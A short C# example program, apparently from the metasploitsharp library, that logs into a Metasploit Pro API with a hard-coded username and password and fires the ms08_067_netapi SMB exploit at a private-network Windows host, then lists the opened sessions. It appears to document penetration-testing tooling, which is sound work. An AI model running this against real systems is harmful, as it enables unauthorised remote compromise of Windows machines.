using System;
using metasploitsharp;
using System.Collections.Generic;

namespace ModuleExecuteExample
{
	class MainClass
	{
		public static void Main (string[] args)
		{
			using (MetasploitSession session = new MetasploitSession("metasploit", "-LG.\"9U5", "https://192.168.1.148:3790/api/1.1"))
			{
				if (string.IsNullOrEmpty(session.Token))
					throw new Exception("Login failed. Check credentials");
				
				using (MetasploitProManager manager = new MetasploitProManager(session))
				{
					Dictionary<object, object> options = new Dictionary<object, object>();
					
					options.Add("RHOST", "192.168.1.129");
					
					Dictionary<object, object> response = manager.ExecuteModule("exploit", "windows/smb/ms08_067_netapi", options);
					
					foreach (KeyValuePair<object, object> pair in response)
						Console.WriteLine(pair.Key + ": " + pair.Value);
					
					response = manager.ListSessions();
					
					foreach (KeyValuePair<object, object> pair in response)
						Console.WriteLine(pair.Key + ": " + pair.Value);
				}
			}
		}
	}
}
